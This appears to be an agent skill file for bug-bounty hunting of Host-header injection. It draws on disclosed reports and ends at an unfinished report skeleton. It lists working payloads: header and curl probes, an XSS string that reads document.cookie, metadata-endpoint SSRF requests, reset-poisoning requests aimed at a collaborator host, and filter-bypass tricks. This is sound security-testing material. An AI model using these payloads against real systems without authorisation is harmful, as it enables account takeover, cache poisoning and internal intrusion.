---
name: hunt-host-header
description: "Host Header injection / abuse hunting skill built from 35 full disclosed bug-bounty reports (42-report corpus). Covers password-reset poisoning → ATO, web cache poisoning via unkeyed Host / X-Forwarded-Host, reflected XSS and open redirect from trusted Host-derived absolute URLs, routing-based SSRF / internal-subdomain reach via attacker-controlled Host, header-driven email spoofing and token leakage via Referer/Host, duplicate-Host and case-variation parser confusion, and cookie-scope leakage on cross-origin redirects. Use on any forgot-password flow, CDN/reverse-proxy-fronted app, OAuth/OIDC endpoint, invite/email-sending feature, or host-routed ingress. Grounded in real reports: DoD password-reset hijack (#1108874), Concrete CMS (#226659), Shopify cache-poison DoS (#1096609) and blog poisoning (#977851), Omise XSS (#1392935) and redirect (#1444675), Rails HostAuthorization bypass (#1374512), urbancompany internal-subdomain SSRF (#1783015), curl cross-origin cookie leak (#3516878)."
sources: hackerone_public, portswigger_research, public_code_search
report_count: 42
full_reports_read: 35
---

# HUNT-HOST-HEADER — Host Header Injection & Abuse

> **Evidence base.** This skill is built from 35 full disclosed bug-bounty reports that were read
> in full (42-report assigned corpus). Every technique, payload, and citation below is grounded in
> that text; no ID or URL has been invented.
>
> **Dominant observation.** Across the corpus the Host header is trusted as a *source of truth*
> for URL construction, routing, and redirection — so an attacker-controlled string leaks into
> security decisions. Measured technique frequency:
>
> ```
> host-header          35/35   host-header-attack   32
> redirect-handling    25      cache-layer          15
> brute-otp-reset      13      open-redirect        12
> ```
>
> Those four classes — reset poisoning, redirect, cache reflection, and host-routed reach — are
> where nearly all real bounties in this corpus came from. Read them first.

---

## Crown Jewel Targets

Rank targets by the blast radius of the Host-derived string, not by how easy the reflection is.

### 1. Password-reset / forgot-password flows — Critical
Highest value in the corpus: 13 reports carry reset-signal, 3 are explicit full takeover.
The server builds the reset URL from `Host` / `X-Forwarded-Host`, so the victim's email carries
the attacker's host. Canonical outcomes:

- DoD #1108874 — "uses the Host header when sending out password reset links" → Critical ATO.
- Concrete CMS #226659 — the same pattern on `/index.php/login/concrete/forgot_password`.
- Also fold in invite / email verification / "send me a link" / "modify Host sent to email":
  Endless #791293, Logitech-oslo #1072277.

**Why it is crown-jewel:** one poisoned request can capture a token for *any* user who later
requests a reset, which is the difference between a reflected string and account takeover.

### 2. CDN / reverse-proxy / service-mesh fronted apps — Medium to High
15 reports carry cache-layer signal. Shopify #1096609 (Host with arbitrary closed port cached →
DoS, $2,900) and Shopify #977851 (`X-Forwarded-Host` reflected into cached blog/share links,
$1,000) show that an unkeyed, reflected Host becomes mass impact. Fingerprints in the corpus:

- `Server: Varnish` / `Fastly error: unknown domain` (RubyGems #180196)
- `Via: 1.1 vegur` (Gratipay #158482)
- `Server: Netlify` (Homebrew #221908, DoD #2188240's CNAME)
- `server: istio-envoy` (indrive #2076786)

### 3. Host-routed ingress / internal subdomains — High to Critical
urbancompany #1783015 turned Host manipulation into access to otherwise unreachable `av.`, `ims.`,
`mesh.` subdomains (classified SSRF, $500). Any environment where Host selects the backend is a
routing-reach target:

- k8s ingress, virtual hosts, internal forward proxies
- Apache "unrecognized Host → first vhost" fallthrough (IRCCloud #13286)
- internal / QA / sandbox hostnames found by subdomain enumeration
  (#2076786 `internal.qa.delivery.indrive.com`, `internal.sandbox.delivery.indrive.com`)

### 4. Absolute-URL generators — Medium to High
The reflection sinks that convert a trusted Host into XSS, redirect, or spoofing:

- Short-link builders — `$actual_link = "https://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]"` (Rockstar #210875)
- Canonical / OG tags, `<script src>`, `<link href>`, `<base href>`, share buttons (#977851)
- `Location` headers — the single most common concrete finding (12 open-redirect reports):
  Localize #2828499, WakaTime #601287, Nord #758380, Gratipay #157465/#158482, Whisper #94637,
  Hiro #300164, RubyGems #180196/#170333/#2627221, Homebrew #221908, indrive #2076786.
- Content spoofing / text injection when the reflected host renders into a page (#1444675)

### 5. Frameworks with known Host-trust bugs — Medium
- Rails `HostAuthorization` middleware, mixed-case `X-Forwarded-Host` bypass —
  Internet Bug Bounty #1374512, CVE-2021-22942 / CVE-2021-22881.
- `Forwarded: host=evil.com` accepted by rubygems — #2627221.
- libcurl custom-Host cookie scope leak across redirects — #3516878 (2026).

### 6. Stale CNAME / takeover surface — Critical
DoD #2188240: a redelegated `www` CNAME to an unclaimed Netlify app, combined with Host-header
manipulation, produced a Critical subdomain-takeover finding. Enumerate CNAMEs before concludes.

### Severity shorthand from the corpus
- Reset → ATO for any user: **Critical** (#1108874, #226659)
- Routing / internal-subdomain reach: **High–Critical** (#1783015)
- Cache poison → mass redirect or DoS: **Medium–High**, real bounties $1,000–$2,900 (#1096609, #977851)
- Reflected XSS: **Medium**, $200–$300 (#1392935, #1444675)
- Token / email leakage: **Medium–High** (#737042, #1072277)

---

## Attack Surface Signals

### Endpoints and features to inventory first
```
Any password reset / forgot-password / set-password / email-verification / invite endpoint
Any app behind a CDN or reverse proxy (Cloudflare, Varnish, Fastly, Akamai, Nginx, HAProxy,
    Netlify, istio-envoy)
Any host-routed ingress: k8s ingress, service mesh, virtual-host router, internal forward proxy
Any OAuth/OIDC authorization or discovery (.well-known/openid-configuration) endpoint
Any short-link / share / URL-shortening generator built from $_SERVER[HTTP_HOST] + REQUEST_URI
Any email-sending feature: transactional mail, newsletters, notifications, "join our email list"
Any absolute-URL sink: <script src>, <link href>, <base href>, canonical, og:url, Location,
    password-reset link, share button, webhook callback
Any microservice where the Host header picks the upstream backend
Any newsletter/signup box that stores a Referer into an emailed link
```

### Dangerous header candidates — fuzz all of them, not just `Host`
```
Host                  X-Forwarded-Host      X-Host
X-Forwarded-Server    X-HTTP-Host-Override  Forwarded
X-Forwarded-For       X-Original-URL        X-Rewrite-URL
```
Corpus evidence:

- `X-Forwarded-Host` is the single most reused injection vector — #1392935, #1479889, #1444675,
  #977851, #601287, #882220, #1374512.
- `Forwarded: host=evil.com` worked on rubygems (#2627221).
- `X-Forwarded-For` was used to spoof email invites on oslo.io (#1072277).
- Duplicate `Host` headers worked on irccloud (#13286).
- `Referer` (not a Host-* header) poisoned Starbucks' emailed links (#229498).

### Stack / response headers that raise priority
```
Server: Varnish | Fastly error: unknown domain | Via: 1.1 vegur | Server: Netlify
server: istio-envoy | X-Cache / CF-Cache-Status: HIT | Age: <nonzero> | Vary: (missing Host)
Location reflecting our host | Strict-Transport-Security on a 301 to attacker host
```

### Source-code / JS strings to grep
```
$_SERVER[HTTP_HOST]            # Rockstar #210875
request.get_host()             # Django-style reset link builders
Request.Host / req.headers.host
"https://" + host + path       # generic absolute-URL concatenation
config.hosts                   # Rails HostAuthorization allowlist (#1374512)
SITE_URL                       # fixed mailer URL — verify whether it overrides Host
```

---

## Discovery Patterns From 35 Full Reports

### Where Researchers Start (ranked recon surfaces w/ "what to look for")

1. **Forgot-password / reset request interception (highest yield).**
   What to look for: a POST to `/forgot-password`, `/Account/ForgotPassword`, or
   `/index.php/login/concrete/forgot_password` (#226659) whose resulting email contains a URL.
   The classic "how I found it" is simply intercepting the reset request and swapping Host —
   #1108874: *"uses the Host header when sending out password reset links."* Test only your own
   account. A second pattern is the token leaking on the *click* via Host/Referer (#737042,
   #1092831) rather than in the email link itself.

2. **Any page whose `Location` or absolute URLs change when Host changes.**
   What to look for: capture a clean GET, resend with `Host: evil.example` and
   `X-Forwarded-Host: evil.example`, then diff `Location`, `<a href>`, `<script src>`,
   `<link href>`, `og:url`, canonical. #2828499: *"By controlling the Host header and observing
   a redirection to the specified external site, you may have found an open redirect
   vulnerability."* Login, signup, settings, and `?apikeyrefresh=true` are common sinks.

3. **CDN-fronted pages that reflect a canary header.**
   What to look for: inject `X-Forwarded-Host: canary-<random>.example` and grep the body.
   #977851: *"run in loop requests with X-Forwarded-Host: your_hackerz_site.com — after some
   time You will notice in response your_hackerz_site.com."* Reflection plus a shared cache key
   is the poison primitive. Check `X-Cache` / `Age` / `Vary` next.

4. **URL builders seen in source or JS.**
   What to look for: `$_SERVER[HTTP_HOST]`, `request.get_host()`, `Request.Host`, string
   concatenation of protocol + host + path. #210875: *"I noticed you are using unsafe host
   header in generating short links,"* then *"Did you notice the usage of HTTP_HOST which is
   variable and could be changed by sending different host header values, this will result in
   creating malicious urls."* #300164 was found by public code search on GitHub (`blockstack-core`).

5. **Email-generating features beyond reset.**
   What to look for: invite, team-add, newsletter signup, "send me a link" — inspect the *email
   body*, not only the HTTP response. #229498 found Host injection via the `Referer` attribute
   in Starbucks' "Join our email list" boxes; #791293 found the password-reset mail taking its
   source domain straight from `Host`.

6. **Internal / QA / staging hostnames from subdomain enumeration.**
   What to look for: hosts named `internal.*`, `*.qa.*`, `*.sandbox.*`. #2076786: *"Found the
   host header injection of given URLs: https://internal.qa.delivery.indrive.com/ …"* #1783015
   enumerated `av.`/`ims.`/`mesh.urbancompany.com` and found Host-based access to them.

7. **Dangling CNAMEs / takeover candidates.**
   What to look for: CNAME to Netlify / Heroku / GitHub Pages with an unclaimed target.
   #2188240 combined a takeover with host header manipulation on `www.█████` (DoD, Critical).

8. **Framework/version fingerprinting for known Host bugs.**
   What to look for: Rails (HostAuthorization case-variation bypass #1374512), libcurl redirects
   plus custom Host (#3516878), Varnish/Fastly host confusion (#180196). Older PHP/Apache stacks
   are overrepresented in the redirect class (#210875, #157465, #300164).

9. **Image / asset / SVG paths that embed absolute URLs (10 image-processing reports).**
   What to look for: cached image or SVG URLs constructed from Host; Shopify #1096609's poison was
   reached through a theme/image asset feature, and the corpus repeatedly pairs image-processing
   with cache and XSS signals (#1096609, #882220, #1630073).

10. **Templated pages and comments that echo request context (9 comment-injection reports).**
    What to look for: any page where the Host lands in rendered HTML or a comment block; this is
    the reflection substrate for the Homebrew/Whisper/irccloud payloads (#221908, #94637, #13286).

11. **Public source / config repositories (3 public-code-search reports).**
    What to look for: `$_SERVER[HTTP_HOST]` in GitHub projects (#300164 `blockstack-core`),
    `config.hosts` allowlists in Rails code (#1374512), hardcoded `SITE_URL` in mailer configs.
    A code-search hit tells you the exact sink before you send a single request.

### Feature-Based Discovery Signals (frequency-ranked table w/ "why it matters / what to probe")

| Signal (corpus frequency) | Why it matters | What to probe |
|---|---|---|
| `host-header` (35/35) | The core input is trusted verbatim; every other signal derives from it | Baseline: swap `Host` on every endpoint and diff responses |
| `host-header-attack` (32) | Confirms active abuse, not passive reflection | Inject Host into reset, redirect, cache, and routing sinks |
| `redirect-handling` (25) | Most common *sink*: 301/302 `Location` built from Host | Send arbitrary Host, inspect `Location` for attacker domain |
| `cache-layer` (15) | Reflection becomes mass impact if cached on an unkeyed key | Canary reflect → poison → clean fetch on same key |
| `brute-otp-reset` (13) | Reset/OTP flow is the ATO bridge | Reset your own acct with poisoned Host; read the email |
| `open-redirect` (12) | Direct, easily-validated finding; phishing primitive | `Host`/`X-Forwarded-Host` on login, signup, settings, `?apikeyrefresh=true` |
| `image-processing` (10) | Co-occurs with cache/XSS paths (SVG, asset URLs) | Check asset/SVG fetches and cached image URLs for Host reflection |
| `comment-injection` (9) | Host reflected into templated pages/comments | Inject a header value that lands in rendered HTML |
| `cookie-handling` (8) | Cookie scope/leak across Host-driven redirects | Custom Host + `-L` redirect; check `Set-Cookie`/`Domain` (#3516878) |
| `search-filter-sort` (7) | Endpoints echo request context into results | Reflect canary via Host on search/filter endpoints |
| `session-attack` (6) | Reflected XSS ⇒ session theft | Probe Host reflection with HTML/JS payload (#1392935) |
| `server-side-rendering` (6) | SSR/template rendering uses Host for base URLs | Inject Host into SSR navigation/template hrefs |
| `xml-parser` (5) | Co-occurs with SSR/redirect in older stacks | Check XML/SVG endpoints for Host-derived external references |
| `proxy-feature` (4) | Proxy trusts Host to select backend | Host-routed reach to internal hosts (#2188240, #1679969) |
| `filter-bypass` (3) | Blocklists exist but are incomplete | Case variation, `Forwarded`, duplicate Host, alternate proxy headers |
| `reflected` (3) | Explicit "server reads request → reflects in response" | Canary grep in body (#882220, #1392935) |
| `subdomain-takeover` (3) | Dangling DNS + Host trust | Resolve all CNAMEs, test takeover, then Host-manipulate |
| `public-code-search` (3) | Bug found by reading public source | GitHub/GitLab search for `$_SERVER[HTTP_HOST]`, `get_host()` |
| `sso-oauth` (3) | Auth flows built on Host | Inject Host on OAuth authorize / OIDC discovery |
| `csrf` (3) | Token leaked via Host/Referer enables state change | Track reset token in `Host`/`Referer` (#737042) |
| `admin-internal` (2) | Dashboard/internals reflect proxy headers | Test `X-Forwarded-Host` on admin pages (#1444675, #1479889) |
| `blind-oob` (2) | Cache/reset confirmed via collaborator callback | Inject Collaborator host, watch inbound hits (#977851, #226659) |
| `url-fetching` (2) | Fetchers use Host for base URL | Test Host on fetch-from-URL features (#1630073, #1679969) |

### Verbatim Discovery Clues (18 real `[#id]` quotes)

Straight from the disclosure text — the researchers' own "how I found it" words. These are the
exact strings that should train your intuition about where to start looking.

1. [#2828499] "By controlling the Host header and observing a redirection to the specified external site, you may have found an open redirect vulnerability."
2. [#1479889] "I have found this bug since feb. 8,2022, when my open redirect in https://dashboard.omise.co got duplicated"
3. [#210875] "I noticed you are using unsafe host header in generating short links."
4. [#210875] "I tried to manipulate the host header to force it to redirect the client to my domain"
5. [#210875] "Did you notice the usage of `HTTP_HOST` which is variable and could be changed by sending different host header values, this will result in creating malicious urls."
6. [#1072277] "I found Host Header injection in oslo.io"
7. [#1072277] "If we try to change the host, 403 will appear. So we will use X-Forwarded-Host: example.com"
8. [#1098948] "While performing security testing on your Main Domain, I found a Host Header Injection Vulnerability."
9. [#1679969] "I found one high bug on your another domain. This is from Hack US Program."
10. [#1783015] "This endpoint looks interesting, but for some reason it doesn't actually initiate any uploading when I tried to upload files with mentioned extension:"
11. [#1783015] "Ability to access certain subdomains (which should be presumably only for internal/trusted sources) through host header manipulation."
12. [#2076786] "Found the host header injection of given URLs: https://internal.qa.delivery.indrive.com/"
13. [#1096609] "I just found the website: https://themes.shopify.com is infected with 'Web cache poisoning' via HOST header lead to Denial of Services"
14. [#1392935] "The server reads data directly from the HTTP request and reflects it back in the HTTP response."
15. [#1444675] "The https://dashboard.omise.co/test/dashboard website is vulnerable to an Open Redirection flaw if the server receives a crafted X-Forwarded-Host header."
16. [#977851] "now remove X-Forwarded-Host — there still be our url: i've logged to my VPS to verify this bug and downloaded poisoned page … it's contains links to collabolator"
17. [#791293] "Password reset mail is taking source domain from request header host, which can be modified using burp suite and the modified link is sent to the victims email"
18. [#1374512] "when sending a request like the following where the URL has a mixed case characters" (Rails HostAuthorization case-variation bypass)

### Probe Checklist (15 concrete probes)

Run all 15 against your own test account / benign canary domain. Each probe names the signal
it is hunting and a corpus reference for the expected behaviour.

1. `Host: evil.example` on `GET /` — does `Location` or any body URL change?
   Expected: 301 `Location: https://evil.example/`. Refs #2828499, #758380.
2. `X-Forwarded-Host: canary-<rand>.example` on `GET /` — grep body for the canary.
   Expected: canary appears in an absolute URL. Refs #1392935, #977851.
3. `X-Forwarded-Host: evil.example` on `/forgot-password` (your own email) — read the link host.
   Expected: reset link host is attacker-controlled. Refs #1108874, #226659.
4. `Host: target.evil.example` (suffix append) on reset flow — bypass naive startswith checks.
   Expected: link points to `target.evil.example`.
5. Duplicate `Host: target` + `Host: evil.example` in one raw request.
   Expected: stack trusts one of them; redirect follows. Ref #13286.
6. Case variation `X-Forwarded-Host: EVIL.COM` vs allowlist `evil.com`.
   Expected: HostAuthorization check misses. Ref #1374512.
7. `Forwarded: host=evil.example`.
   Expected: redirect to attacker host. Ref #2627221.
8. `X-Host: evil.example` and `X-Forwarded-Server: evil.example`.
   Expected: alternate header honored by proxy.
9. `X-Forwarded-For: evil.example` on an invite/email endpoint.
   Expected: email body uses spoofed host. Ref #1072277.
10. `Host: target:1@evil.example` — parser splitting on `:` or `@`.
    Expected: URL parser resolves to evil host.
11. `Host: target:1337` with arbitrary closed port → cache and diff for DoS/poison.
    Expected: cached absolute URLs carry `:1337`. Ref #1096609.
12. `X-Forwarded-Host: evil.example"><img src/onerror=prompt(1)>` — reflected XSS.
    Expected: `img` tag executes. Ref #1392935.
13. Canary reflect → poison → clean fetch (no header) on same URL → confirm cache HIT.
    Expected: payload present after header removed. Ref #977851.
14. `Host: internal.qa.<target>` / known internal subdomains — routing reach.
    Expected: response from internal target or host-specific behavior. Refs #2076786, #1783015.
15. `Referer: https://evil.example/` on newsletter/signup — check the *email body* links.
    Expected: email logo/links redirect to evil host. Ref #229498.

---

## Step-by-Step Hunting Methodology

> Discipline first: only request password resets for **accounts you own**. For every finding,
> name the exact behaviour reproduced (reflected header, poisoned cache key, OOB hit, changed
> `Location`) — never copy an unverified ID or CVE.

### Step 1 — Baseline every response
For each in-scope endpoint, capture a clean request/response pair. Note all absolute URLs:
`Location`, `<a href>`, `<script src>`, `<link href>`, canonical, `og:url`, `Set-Cookie Domain`.
This is your diff target. Without a clean baseline, "reflection" claims are unreliable.

### Step 2 — Reflect test (cheap first pass)
Inject a unique canary across the whole header family and grep the body:
```bash
for H in Host X-Forwarded-Host X-Host X-Forwarded-Server X-HTTP-Host-Override Forwarded; do
  curl -s "https://$TARGET/" -H "$H: canary-$RANDOM.example" | grep -i "canary" && echo "REFLECT: $H"
done
```
A reflected canary is the starting signal for both XSS and cache poisoning (#882220, #1392935,
#977851). Use a fresh random value per header so you can tell which one reflected.

### Step 3 — Redirect test
Diff `Location` with an attacker Host:
```bash
curl -sI "https://$TARGET/login" -H "Host: evil.example" | grep -i "^location"
curl -sI "https://$TARGET/settings/account?apikeyrefresh=true" \
  -H "X-Forwarded-Host: bing.com" | grep -i "^location"
```
Open redirect is the most frequent concrete finding (12 reports). WakaTime #601287 used exactly
the `apikeyrefresh=true` endpoint with `X-Forwarded-Host: bing.com`; Gratipay #158482 showed a
301 plus browser DNS-cache poisoning as an extra impact angle.

### Step 4 — Reset poisoning → ATO (own account)
```bash
# 4a. Host directly
curl -s -X POST "https://$TARGET/forgot-password" -H "Host: evil.example" \
  -d "email=your-test-account@target.com"
# 4b. Proxy-trusted header when Host is overwritten to the real value
curl -s -X POST "https://$TARGET/forgot-password" \
  -H "Host: $TARGET" -H "X-Forwarded-Host: evil.example" \
  -d "email=your-test-account@target.com"
# 4c. Raw duplicate Host (Repeater, two Host lines)
# 4d. Case variation / Forwarded header per Bypass Techniques
```
Open the email in your own inbox and read the link host. Strongest proof: inject a **Burp
Collaborator** subdomain as the host so a click/preview fetch delivers the token to you
out-of-band. DoD #1108874, Concrete #226659, Endless #791293, Stripo #737042, Shopify #1092831
all turned on "link built from Host." Remember #737042/#1092831: the token can leak via the
`Referer`/`Host` of the *click* rather than the email link itself.

### Step 5 — Cache poisoning (reflection + shared cache)
```bash
# 5a. is it reflected and cacheable?
curl -s "https://$TARGET/?cb=$RANDOM" -H "X-Forwarded-Host: canary-$RANDOM.example" | grep -i canary
curl -sI "https://$TARGET/?cb=$RANDOM" | grep -iE "x-cache|cf-cache-status|age|via|vary|surrogate"
# 5b. poison once, then fetch CLEAN on the same key from a second machine / incognito
curl -s "https://$TARGET/?cb=poison$RANDOM" -H "X-Forwarded-Host: evilcdn.example" >/dev/null
curl -s "https://$TARGET/?cb=poison$RANDOM" | grep -i "evilcdn.example"
# 5c. closed-port Host → cached DoS
curl -ik "https://$TARGET/?g4mm4=hitthecache" -H "Host: $TARGET:1337" | grep ":1337"
```
Shopify #977851 proved poisoning when the page still contained collaborator links after the
header was removed; #1096609 achieved cache-based DoS via an arbitrary closed port. Check
`Vary`: if the poisoned header is **unkeyed**, the impact is mass.

### Step 6 — Host-routed reach / SSRF
Keep the path on the request line; the Host selects the upstream:
```bash
curl -s "https://$TARGET/" -H "Host: internal-admin.$TARGET"
curl -s "https://$TARGET/" -H "Host: 169.254.169.254"   # routing SSRF toward metadata
curl -s "https://$TARGET/" -H "Host: localhost:6379"
```
urbancompany #1783015 reached otherwise-inaccessible internal subdomains this way. IRCCloud
#13286 exploited Apache's "unrecognized Host → first vhost" fallthrough. Do not conflate Host
routing with `X-Original-URL`/`X-Rewrite-URL` path-override — those are different layers.

### Step 7 — Framework-specific probes
- Case-varied `X-Forwarded-Host` for Rails HostAuthorization (#1374512).
- `Forwarded: host=evil.com` (#2627221).
- Custom Host + redirect cookie scope for clients like curl (#3516878).
- `nc target 80` raw requests when a proxy normalizes headers in your client (#170333).

### Step 8 — Email-body verification
For any invite/newsletter/signup, inspect the actual email body (Starbucks #229498 used `Referer`
to redirect all links in the welcome email). A header reflected in the HTTP response does not
guarantee a poisoned email — verify the message itself. Watch for a fixed `SITE_URL` that the
mailer substitutes regardless of Host.

### Step 9 — Track token flow
Where a reset token is involved, follow it through both the email link and the click's
`Host`/`Referer` (#737042, #1092831). Capture the token on Collaborator to convert "leak" into
demonstrable ATO.

### Step 10 — Document and grade
Capture the exact request, response diff, email, or cache HIT from a second IP; then assign
severity per Gate 0. Include the stack headers (`Via`, `Server`, `Age`) that prove a shared cache
and the absence of `Vary` that proves unkeyed reflection.

### Quick triage decision tree
```
Host header changed
├─ Location or body absolute URL changes?
│   ├─ yes → is it cached on an unkeyed key (HIT, no Vary)?
│   │         ├─ yes → CACHE POISONING → test clean fetch from 2nd IP (#977851, #1096609)
│   │         └─ no  → OPEN REDIRECT / REFLECTION → grade by phishing or XSS chain (#2828499)
│   └─ no  → continue
├─ Reset/invite/email flow? → read the EMAIL BODY; token on attacker host = ATO (#1108874)
├─ Response from internal host or host-specific behavior? → ROUTING REACH / SSRF (#1783015)
└─ Reflection into HTML with HTML chars preserved? → REFLECTED XSS (#1392935)
```

### Guardrails
- Never test reset poisoning against another user's account.
- Never leave a poisoned cache entry on a production key longer than needed — restore clean state.
- Do not claim ATO from a reflected string alone; capture the token or show the poisoned email.
- Distinguish "Host-based routing" from "path override" (`X-Original-URL`/`X-Rewrite-URL`) — they
  act at different layers and do not compose into a single request.

---

## Payload & Detection Patterns

### Core header payloads
```bash
# direct Host override
Host: evil.example
# reverse-proxy variants (try each independently)
X-Forwarded-Host: evil.example
X-Host: evil.example
X-Forwarded-Server: evil.example
X-HTTP-Host-Override: evil.example
Forwarded: host=evil.example
X-Forwarded-For: evil.example
# duplicate Host (raw socket / repeater with two lines)
Host: $TARGET
Host: evil.example
# suffix append / parser confusion
Host: $TARGET.evil.example
Host: $TARGET:1@evil.example
```

### Reset / ATO payloads
```bash
curl -s -X POST "https://$TARGET/forgot-password" \
  -H "Host: YOUR.collaborator.example" -d "email=your-test@target.com"
# then capture the token when the link is clicked/previewed on Collaborator
```

### Reflected XSS via X-Forwarded-Host
```
X-Forwarded-Host: bing.com"><img src/onerror=prompt(document.cookie)>
```
Source: Omise #1392935 / DoD #882220 — the server read the header and reflected it into the
response, executing the injected `img` handler. Pair with a cache key for stored impact.

### Open redirect
```
Host: constitutionclub.in        -> 301 Location: https://constitutionclub.in/   (Nord #758380)
X-Forwarded-Host: bing.com       -> redirect to bing.com                        (WakaTime #601287)
Host: crowdshield.com            -> 301 Location: https://crowdshield.com/      (Whisper #94637)
Host: bing.com                   -> 301 Location: https://bing.com/             (indrive #2076786)
Host: www.google.com             -> 301 Location: https://google.com/           (Homebrew #221908)
Host: heroku.com                 -> 301 Location: https://www.heroku.com/       (Gratipay #158482)
```

### Cache poisoning / DoS
```bash
# arbitrary closed port cached into absolute URLs -> DoS
curl -ik "https://$TARGET/?g4mm4=hitthecache" -H "Host: $TARGET:1337" | grep ":1337"
# X-Forwarded-Host reflected into cached share links
X-Forwarded-Host: your_hackerz_site.com
```

### Routing / internal reach
```bash
Host: internal.qa.delivery.$TARGET
Host: av.$TARGET / ims.$TARGET / mesh.$TARGET
Host: 169.254.169.254
Host: localhost:6379
```

### Framework-specific
```bash
# Rails HostAuthorization mixed-case bypass
curl 'http://localhost:3000/tests' -H 'X-Forwarded-Host: EVIL.COM'
# curl/libcurl custom Host + cross-origin redirect cookie scope
curl -v -L -c cookies.txt -H "Host: example.com" \
  --resolve b.com:8001:127.0.0.1 --resolve a.com:8000:127.0.0.1 a.com:8000
```

### Absolute-URL reflection contexts to inspect
```
Location: <script src="https://HOST/..."> <link href="https://HOST/...">
<base href="https://HOST/"> <a href="https://HOST/..."> canonical / og:url
<meta property="og:image" content="https://HOST/...">
share buttons: https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2FHOST%2F...
password-reset link, webhook target, invite link, short-link output
```
Shopify #977851's poisoned page surfaced attacker links in a Facebook share button — inspect
every absolute URL in the body, not just the visible navigation.

### Detection grep / fuzzing
```bash
# reflection sweep
grep -iE "canary|evil.example|bing.com|collaborator" <response>
# cache headers that enable poisoning
grep -iE "cache-control|x-cache|cf-cache-status|age|via|surrogate|vary"
# Param Miner: Guess headers (Burp) finds unkeyed/cache-affecting headers beyond this list
# raw duplicate/case tests need a raw request editor (Repeater), not curl -H dedup
```

### Impact checklist before escalating a finding
- [ ] Attacker-controlled host appears in the *delivered* email body, not just the response.
- [ ] Clean request on the same cache key returns the payload (second IP / incognito).
- [ ] `Vary` does not include the poisoned header (unkeyed = mass impact).
- [ ] `Location` points to the attacker domain on a real browser follow.
- [ ] Token captured on Collaborator for reset/OIDC poisoning.
- [ ] Internal host returned content, or a host-specific response was observed.

---

## Common Root Causes

1. **Host treated as a URL-building primitive.** `$_SERVER[HTTP_HOST]` /
   `request.get_host()` / `Request.Host` concatenated into absolute URLs with no allowlist —
   the backbone of reset poisoning (#1108874, #226659, #791293) and short-link abuse (#210875).

2. **Blind trust in proxy headers.** `X-Forwarded-Host`, `Forwarded`, `X-Host` are honored even
   though the client controls them; occurs in XSS, redirect, and cache poisoning (#1392935,
   #1479889, #1444675, #2627221, #977851).

3. **No validation of `Location` targets.** Redirect endpoints incorporate the request host
   directly; 25 reports carry redirect-handling signal and 12 are classified open redirect
   (#2828499, #601287, #758380, #157465, #94637, #300164).

4. **Unkeyed, reflected input cached by shared infrastructure.** A reflected Host that is not
   part of the cache key becomes mass impact (#977851) or a cache-based DoS (#1096609).

5. **Host-based routing / virtual-host fallthrough.** The front-end selects a backend from Host,
   or an unrecognized Host falls through to a default vhost — enabling internal reach
   (#1783015, #13286, #2076786).

6. **Token/reference leakage into `Referer` and `Host`.** Reset tokens travel with third-party
   hosts or referrers (#737042, #1092831, #229498).

7. **Incomplete validation logic.** Case-sensitive allowlists (Rails #1374512), alternate header
   forms (`Forwarded` #2627221), duplicate Host parsing (#13286), and unclaimed CNAMEs
   (#2188240) all defeat naive checks.

8. **Client-side scope confusion.** Custom Host carried across redirects leaks/injects cookies
   scoped to the original host (#3516878).

9. **Fixed site URL assumptions in mailers.** A `SITE_URL` constant may be trusted in one code
   path and Host in another; always verify the delivered email, not the response body.

---

## Bypass Techniques

When a naive `Host: evil.example` is blocked or sanitized, use these corpus-grounded alternatives:

- **Alternate proxy headers** — if Host is overwritten by the proxy, try `X-Forwarded-Host`
  (#1072277: *"change the host, 403 will appear. So we will use X-Forwarded-Host"*), `X-Host`,
  `X-Forwarded-Server`, `X-HTTP-Host-Override`, and `Forwarded: host=evil.com` (#2627221).

- **Case variation** — allowlists that compare case-sensitively miss `EVIL.COM` vs `evil.com`
  (Rails #1374512, CVE-2021-22942 / CVE-2021-22881).

- **Duplicate Host** — two `Host` lines in one request; some stacks trust the second, others the
  first (#13286: `Host: google.com` then `Host: www.irccloud.com`). Requires a raw request editor.

- **Suffix / subdomain append** — `Host: target.evil.example` beats naive `startswith(target)`
  checks and keeps the real domain as a prefix (classic reset-poisoning variant).

- **Userinfo / port parser confusion** — `Host: target:1@evil.example` splits differently in URL
  parsers vs proxies; arbitrary ports also enable cache-poison DoS (#1096609).

- **Referer-driven email poisoning** — when Host is blocked, the email generator may trust
  `Referer` instead (#229498).

- **Stale CNAME takeover** — when the target is an unclaimed cloud app, claim it first, then the
  poisoned absolute URLs resolve to infrastructure you control (#2188240).

- **Cached reflection across key scope** — if one edge is keyed, retest on a fresh egress IP /
  different cache node; #977851 found "no URL keys" after repeated looped requests.

- **Client redirect chains** — for cookie/scope bugs, combine a custom Host with `-L` across
  hosts that resolve to the same IP (#3516878).

- **Raw TCP requests** — use `nc target 80` when an HTTP client normalizes or dedups headers,
  so the duplicate/case-variation payload reaches the server verbatim (#170333).

---

## Gate 0 Validation

Before writing the report, confirm all three.

### 1. What can the attacker do right now?
- **Reset:** does the token URL in *your own* test account's email use an attacker-controlled host,
  or did a Collaborator host capture the token on click? A 200 that echoes your Host is not ATO.
- **Redirect:** does `Location` actually point to the attacker domain, not merely reflect a string
  into a benign page? Confirm with a real browser follow.
- **Cache:** does a **clean** request (header omitted, fresh IP/incognito) on the same key return
  the payload? If `Vary` includes the header or every response is `MISS`/`Age:0`, no mass impact.
- **Routing:** do you get real internal content, or at least a host-specific response from the
  internal target? Reflection alone is not SSRF.

### 2. What does the victim lose?
- Token captured → ATO for any user (Critical, per #1108874 / #226659).
- Mass cache poison → XSS/redirect/DoS to every visitor on that cache key (#1096609, #977851).
- Internal reach → access to non-public subdomains/data (#1783015).
- Cookie scope leak → session exposure across origins (#3516878).
- If the answer is only "a header was reflected," grade Low/informational.

### 3. Can it be reproduced in 10 minutes from scratch?
- Is the vulnerable endpoint live? Does the poisoned cache entry still exist on a clean fetch?
- Can a second person with a fresh egress IP reproduce the cache/redirect result?
- For token-capture, does the Collaborator hit arrive reliably on each run?

### False-positive killers (mandatory)
- Reflected ≠ cached; cached-for-you ≠ cached-for-others (check `Vary`, second IP).
- A Host echoed in an error/body is not SSRF and not ATO unless the token/payload actually lands
  on the attacker-controlled host.
- Some mailers rewrite links to a fixed `SITE_URL` regardless of Host — verify the *email body*.
- A vendor may consider a pure reflected open redirect out of scope; pair it with a poisoned
  reset/cache or phishing chain to demonstrate real impact.
- Panic/"first vhost" redirects can be environment quirks; confirm the behaviour is consistent and
  reachable from the public entry point before reporting.

### Minimal report skeleton
```
